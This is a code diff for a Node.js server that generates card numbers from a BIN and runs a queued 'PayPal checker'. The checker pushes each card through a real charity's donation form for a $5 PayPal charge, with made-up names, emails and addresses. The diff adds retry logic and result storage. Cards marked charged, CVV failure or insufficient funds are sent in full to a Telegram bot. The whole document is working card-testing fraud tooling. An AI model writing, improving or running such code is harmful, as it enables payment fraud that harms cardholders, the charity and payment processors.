@@ -16,16 +16,18 @@ const TELEGRAM_CHAT = '-1003774370016';
 // Background job queue for PayPal checks
 const paypalQueue = [];
 let isProcessingPaypal = false;
+const paypalResults = [];
+const MAX_RESULTS = 1000;
 
 app.get('/api/health', (req, res) => res.json({ ok: true }));
 
 // Generate cards from BIN
 app.post('/api/generate', async (req, res) => {
   try {
-    const { bin, month = '12', year = '2031', qty = 10 } = req.body;
+    const { bin, month = '12', year = '2031', quantity = 10 } = req.body;
     const data = new URLSearchParams({
       type: '3', bin, date: 'on', s_date: month, year,
-      csv: '', s_csv: '', number: qty.toString(), format: 'pipe'
+      csv: '', s_csv: '', number: quantity.toString(), format: 'pipe'
     });
     const response = await axios.post('https://namsogen.org/ajax.php', data, {
       headers: {
@@ -293,8 +295,15 @@ app.post('/api/paypal/queue', async (req, res) => {
 app.get('/api/paypal/queue', (req, res) => {
   res.json({ 
     queueSize: paypalQueue.length, 
-    isProcessing: isProcessingPaypal 
+    isProcessing: isProcessingPaypal,
+    results: paypalResults.slice(-50) // Last 50 results
   });
+});
+
+// Clear results
+app.post('/api/paypal/clear', (req, res) => {
+  paypalResults.length = 0;
+  res.json({ success: true });
 });
 
 // Process PayPal queue in background
@@ -306,148 +315,181 @@ async function processPaypalQueue() {
   
   isProcessingPaypal = true;
   const item = paypalQueue.shift();
+  let status = 'error';
+  let message = 'Unknown error';
+  let retryCount = 0;
+  const maxRetries = 3;
   
-  try {
-    const [num, mon, yer, cvc] = item.card.split('|');
-    const year = yer.length === 4 ? yer.slice(-2) : yer;
-    
-    const firstName = ['James', 'John', 'Robert', 'Michael'][Math.floor(Math.random() * 4)];
-    const lastName = ['Smith', 'Johnson', 'Williams', 'Brown'][Math.floor(Math.random() * 4)];
-    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${Math.floor(Math.random() * 999)}@gmail.com`;
-    const phone = `+1${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 9000 + 1000)}`;
-    const street = `${Math.floor(Math.random() * 9000 + 100)} Main St`;
-    const city = ['New York', 'Los Angeles', 'Chicago'][Math.floor(Math.random() * 3)];
-    const state = ['NY', 'CA', 'IL'][Math.floor(Math.random() * 3)];
-    const zip = Math.floor(Math.random() * 90000 + 10000).toString();
-    
-    const cardType = {'3': 'JCB', '4': 'VISA', '5': 'MASTER_CARD', '6': 'DISCOVER'}[num[0]] || 'VISA';
-    
-    const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
-    const session = axios.create({ headers: { 'User-Agent': ua } });
-    
-    const formPage = await session.get('https://www.brightercommunities.org/donate-form/');
-    const hashMatch = formPage.data.match(/name="give-form-hash" value="([^"]+)"/);
-    const formIdMatch = formPage.data.match(/name="give-form-id" value="([^"]+)"/);
-    const prefixMatch = formPage.data.match(/name="give-form-id-prefix" value="([^"]+)"/);
-    
-    if (!hashMatch || !formIdMatch || !prefixMatch) {
-      console.log('PayPal Queue: Form data not found');
-      setTimeout(processPaypalQueue, 5000);
-      return;
-    }
-    
-    const orderRes = await session.post(
-      'https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
-      new URLSearchParams({
-        'give-form-id-prefix': prefixMatch[1],
-        'give-form-id': formIdMatch[1],
-        'give-form-minimum': '5.00',
-        'give-form-hash': hashMatch[1],
-        'give-amount': '5.00',
-        'give_first': firstName,
-        'give_last': lastName,
-        'give_email': email
-      })
-    );
-    
-    const orderId = orderRes.data?.data?.id;
-    if (!orderId) {
-      console.log('PayPal Queue: Order ID not found');
-      setTimeout(processPaypalQueue, 5000);
-      return;
-    }
-    
-    const paypalRes = await session.post(
-      'https://www.paypal.com/graphql?fetch_credit_form_submit=',
-      {
-        query: `mutation payWithCard($token: String!, $card: CardInput, $phoneNumber: String, $firstName: String, $lastName: String, $billingAddress: AddressInput, $shippingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType) {
-          approveGuestPaymentWithCreditCard(token: $token, card: $card, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, shippingAddress: $shippingAddress, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType) {
-            flags { is3DSecureRequired }
-            cart { intent cartId buyer { userId auth { accessToken } } }
+  while (retryCount < maxRetries) {
+    try {
+      const [num, mon, yer, cvc] = item.card.split('|');
+      const year = yer.length === 4 ? yer.slice(-2) : yer;
+      
+      const firstName = ['James', 'John', 'Robert', 'Michael', 'William', 'David'][Math.floor(Math.random() * 6)];
+      const lastName = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia'][Math.floor(Math.random() * 6)];
+      const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${Math.floor(Math.random() * 999)}@gmail.com`;
+      const phone = `+1${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 900 + 100)}${Math.floor(Math.random() * 9000 + 1000)}`;
+      const street = `${Math.floor(Math.random() * 9000 + 100)} ${['Main', 'Oak', 'Pine', 'Maple', 'Cedar'][Math.floor(Math.random() * 5)]} St`;
+      const city = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix'][Math.floor(Math.random() * 5)];
+      const state = ['NY', 'CA', 'IL', 'TX', 'AZ'][Math.floor(Math.random() * 5)];
+      const zip = Math.floor(Math.random() * 90000 + 10000).toString();
+      
+      const cardType = {'3': 'JCB', '4': 'VISA', '5': 'MASTER_CARD', '6': 'DISCOVER'}[num[0]] || 'VISA';
+      
+      const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+      const session = axios.create({ headers: { 'User-Agent': ua }, timeout: 30000 });
+      
+      // Step 1: Get form data
+      const formPage = await session.get('https://www.brightercommunities.org/donate-form/');
+      const hashMatch = formPage.data.match(/name="give-form-hash" value="([^"]+)"/);
+      const formIdMatch = formPage.data.match(/name="give-form-id" value="([^"]+)"/);
+      const prefixMatch = formPage.data.match(/name="give-form-id-prefix" value="([^"]+)"/);
+      
+      if (!hashMatch || !formIdMatch || !prefixMatch) {
+        throw new Error('Form data not found');
+      }
+      
+      // Step 2: Create PayPal order
+      const orderRes = await session.post(
+        'https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
+        new URLSearchParams({
+          'give-form-id-prefix': prefixMatch[1],
+          'give-form-id': formIdMatch[1],
+          'give-form-minimum': '5.00',
+          'give-form-hash': hashMatch[1],
+          'give-amount': '5.00',
+          'give_first': firstName,
+          'give_last': lastName,
+          'give_email': email
+        })
+      );
+      
+      const orderId = orderRes.data?.data?.id;
+      if (!orderId) {
+        throw new Error('Order ID not found');
+      }
+      
+      // Step 3: Pay with card
+      const paypalRes = await session.post(
+        'https://www.paypal.com/graphql?fetch_credit_form_submit=',
+        {
+          query: `mutation payWithCard($token: String!, $card: CardInput, $phoneNumber: String, $firstName: String, $lastName: String, $billingAddress: AddressInput, $shippingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType) {
+            approveGuestPaymentWithCreditCard(token: $token, card: $card, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, shippingAddress: $shippingAddress, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType) {
+              flags { is3DSecureRequired }
+              cart { intent cartId buyer { userId auth { accessToken } } }
+            }
+          }`,
+          variables: {
+            token: orderId,
+            card: {
+              cardNumber: num,
+              type: cardType,
+              expirationDate: `${mon}/20${year}`,
+              postalCode: zip,
+              securityCode: cvc
+            },
+            phoneNumber: phone,
+            firstName: firstName,
+            lastName: lastName,
+            billingAddress: {
+              givenName: firstName,
+              familyName: lastName,
+              country: 'US',
+              line1: street,
+              line2: '',
+              city: city,
+              state: state,
+              postalCode: zip
+            },
+            shippingAddress: {
+              givenName: firstName,
+              familyName: lastName,
+              country: 'US',
+              line1: street,
+              line2: '',
+              city: city,
+              state: state,
+              postalCode: zip
+            },
+            email: email,
+            currencyConversionType: 'PAYPAL'
           }
-        }`,
-        variables: {
-          token: orderId,
-          card: {
-            cardNumber: num,
-            type: cardType,
-            expirationDate: `${mon}/20${year}`,
-            postalCode: zip,
-            securityCode: cvc
-          },
-          phoneNumber: phone,
-          firstName: firstName,
-          lastName: lastName,
-          billingAddress: {
-            givenName: firstName,
-            familyName: lastName,
-            country: 'US',
-            line1: street,
-            line2: '',
-            city: city,
-            state: state,
-            postalCode: zip
-          },
-          shippingAddress: {
-            givenName: firstName,
-            familyName: lastName,
-            country: 'US',
-            line1: street,
-            line2: '',
-            city: city,
-            state: state,
-            postalCode: zip
-          },
-          email: email,
-          currencyConversionType: 'PAYPAL'
-        }
-      },
-      { headers: { 'Content-Type': 'application/json' } }
-    );
-    
-    const responseText = JSON.stringify(paypalRes.data);
-    let status = 'declined';
-    let message = 'Unknown';
-    
-    if (responseText.includes('accessToken') || responseText.includes('cartId')) {
-      status = 'charged';
-      message = 'Charged $5.00';
-    } else if (responseText.includes('INVALID_SECURITY_CODE')) {
-      status = 'cvv';
-      message = 'CVV2 Failure';
-    } else if (responseText.includes('INVALID_BILLING_ADDRESS')) {
-      status = 'insufficient';
-      message = 'Insufficient Funds';
-    } else if (responseText.includes('EXISTING_ACCOUNT_RESTRICTED')) {
-      status = 'restricted';
-      message = 'Account Restricted';
-    } else if (responseText.includes('RISK_DISALLOWED')) {
-      status = 'risk';
-      message = 'Risk Disallowed';
-    } else if (responseText.includes('ISSUER_DECLINE')) {
-      status = 'declined';
-      message = 'Issuer Decline';
-    } else if (responseText.includes('EXPIRED_CARD')) {
-      status = 'expired';
-      message = 'Expired Card';
-    }
-    
-    console.log(`PayPal Queue: ${item.card} - ${status}: ${message}`);
-    
-    // Send Telegram for good cards
-    if ((status === 'charged' || status === 'cvv' || status === 'insufficient') && item.botToken) {
-      try {
-        const text = `💳 *PAYPAL ${status.toUpperCase()}*\n\`\`\`\n${item.card}\n\`\`\`\n✅ ${message}\n⏰ ${new Date().toLocaleString()}`;
-        await axios.post(`https://api.telegram.org/bot${item.botToken}/sendMessage`, {
-          chat_id: item.chatId, text, parse_mode: 'Markdown'
-        });
-      } catch (e) {
-        console.log('Telegram error:', e.message);
+        },
+        { headers: { 'Content-Type': 'application/json' } }
+      );
+      
+      const responseText = JSON.stringify(paypalRes.data);
+      
+      // Parse response
+      if (responseText.includes('accessToken') || responseText.includes('cartId')) {
+        status = 'charged';
+        message = 'Charged $5.00';
+      } else if (responseText.includes('INVALID_SECURITY_CODE')) {
+        status = 'cvv';
+        message = 'CVV2 Failure';
+      } else if (responseText.includes('INVALID_BILLING_ADDRESS')) {
+        status = 'insufficient';
+        message = 'Insufficient Funds';
+      } else if (responseText.includes('EXISTING_ACCOUNT_RESTRICTED')) {
+        status = 'restricted';
+        message = 'Account Restricted';
+      } else if (responseText.includes('RISK_DISALLOWED')) {
+        status = 'risk';
+        message = 'Risk Disallowed';
+      } else if (responseText.includes('ISSUER_DECLINE')) {
+        status = 'declined';
+        message = 'Issuer Decline';
+      } else if (responseText.includes('EXPIRED_CARD')) {
+        status = 'expired';
+        message = 'Expired Card';
+      } else if (responseText.includes('GRAPHQL_VALIDATION_FAILED')) {
+        status = 'error';
+        message = 'Validation Failed';
+      } else {
+        status = 'declined';
+        message = 'Declined';
+      }
+      
+      // Success - break retry loop
+      break;
+      
+    } catch (e) {
+      retryCount++;
+      console.log(`PayPal Queue Retry ${retryCount}/${maxRetries} for ${item.card}: ${e.message}`);
+      if (retryCount >= maxRetries) {
+        status = 'error';
+        message = e.message;
+      } else {
+        await new Promise(r => setTimeout(r, 2000 * retryCount));
       }
     }
-    
-  } catch (e) {
-    console.log('PayPal Queue Error:', e.message);
+  }
+  
+  // Store result
+  paypalResults.push({
+    card: item.card,
+    status,
+    message,
+    time: new Date().toISOString()
+  });
+  
+  // Keep only last MAX_RESULTS
+  if (paypalResults.length > MAX_RESULTS) {
+    paypalResults.shift();
+  }
+  
+  console.log(`PayPal Queue: ${item.card} - ${status}: ${message}`);
+  
+  // Send Telegram ONLY for LIVE cards (charged, cvv, insufficient)
+  if ((status === 'charged' || status === 'cvv' || status === 'insufficient') && item.botToken) {
+    try {
+      const text = `💳 *PAYPAL ${status.toUpperCase()}*\n\`\`\`\n${item.card}\n\`\`\`\n✅ ${message}\n⏰ ${new Date().toLocaleString()}`;
+      await axios.post(`https://api.telegram.org/bot${item.botToken}/sendMessage`, {
+        chat_id: item.chatId, text, parse_mode: 'Markdown'
+      });
+    } catch (e) {
+      console.log('Telegram error:', e.message);
+    }
   }
   
   // Continue with next card after delay
